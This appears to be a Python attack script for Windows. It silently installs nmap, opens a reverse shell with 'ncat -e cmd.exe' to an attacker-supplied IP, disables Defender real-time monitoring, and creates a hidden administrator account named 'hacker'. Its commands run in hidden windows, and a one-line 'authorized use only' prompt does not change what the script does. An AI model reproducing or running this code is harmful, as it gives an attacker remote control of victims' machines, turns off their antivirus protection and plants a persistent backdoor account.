import sys
import requests
import os
import colorama
from colorama import Fore
import subprocess
colorama.init(autoreset=True)

# Installation Guide
url = 'https://nmap.org/dist/nmap-7.95-setup.exe'
filename = 'nmap-7.95-setup.exe'

current_user = os.getlogin()
user = os.environ.get('DB_USER')

def download_nmap():
    response = requests.get(url)
    if response.status_code == 200:
        with open(filename, 'wb') as file:
            file.write(response.content)
        print(Fore.GREEN + "nmap downloaded successfully.")
        install_nmap()
    else:
        print(Fore.RED + "Failed to download nmap.")
        sys.exit()

def install_nmap():
    subprocess.run(f"{filename} /quiet", shell=True)
    print(Fore.GREEN + "Nmap installed successfully.")

# Helper function to run commands silently
def run_command_hidden(command):
    try:
        subprocess.run(
            command,
            shell=True,
            check=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
    except subprocess.CalledProcessError as e:
        print(f"Error executing command: {command}\nError: {e.stderr.decode()}")

# ReverseShell
def reverse_shell(target_ip, target_port):
    username = os.getlogin()
    log_output = [f"Running commands for user: {username}"]

    # Start ncat in hidden mode with corrected variable names
    run_command_hidden(f'ncat -e cmd.exe {target_ip} {target_port}')
    log_output.append(f"[START] ReverseShell is Running on Victim")

    # Timeout to keep the session alive
    run_command_hidden('timeout /t 86400 /nobreak >nul 2>&1')
    log_output.append(f"[TIMEOUT] CMD has decided to take a vacation for one day.")

    # Disable PowerShell realtime monitoring
    run_command_hidden('powershell Set-MpPreference -DisableRealtimeMonitoring $true')
    log_output.append("[DISABLE] PowerShell Disable real-time monitoring")

    # Adding new user
    run_command_hidden('net user hacker Password123 /add')
    log_output.append("[ADDING] User 'hacker' added")

    # Adding user to administrators group
    run_command_hidden('net localgroup administrators hacker /add')
    log_output.append("[ADDING] User 'hacker' added to administrators group")

    # Log active ports
    run_command_hidden('netstat -a')
    log_output.append("[PORTS] Logged open ports.")

    # Save logs to a file
    if current_user.lower() == user.lower():
        with open('log.txt', 'a') as file:
            for log in log_output:
                file.write(log + "\n")
    else:
        print("Access Denied!")

if __name__ == '__main__':
    # Ask user for legal permission before running the script
    confirmation = input(
        Fore.YELLOW + "This script is for authorized use only\n"
                      ".Do you confirm that you are using this script for legal purposes and you agree to Terms_and_Conditions.md? (yes/no): ").strip().lower()

    if confirmation == 'yes':
        # Ask for IP and port to be used in reverse shell
        ip = input(Fore.YELLOW + "Please enter your attacker's IP address: ").strip()
        port = input(Fore.YELLOW + "Please enter the port to use: ").strip()
        if not os.path.exists(filename):
            download_nmap()

        reverse_shell(ip, port)  # Pass ip and port to the reverse_shell function
    else:
        print(Fore.RED + "You must confirm that this script is used for legal purposes. Exiting...")
        sys.exit()
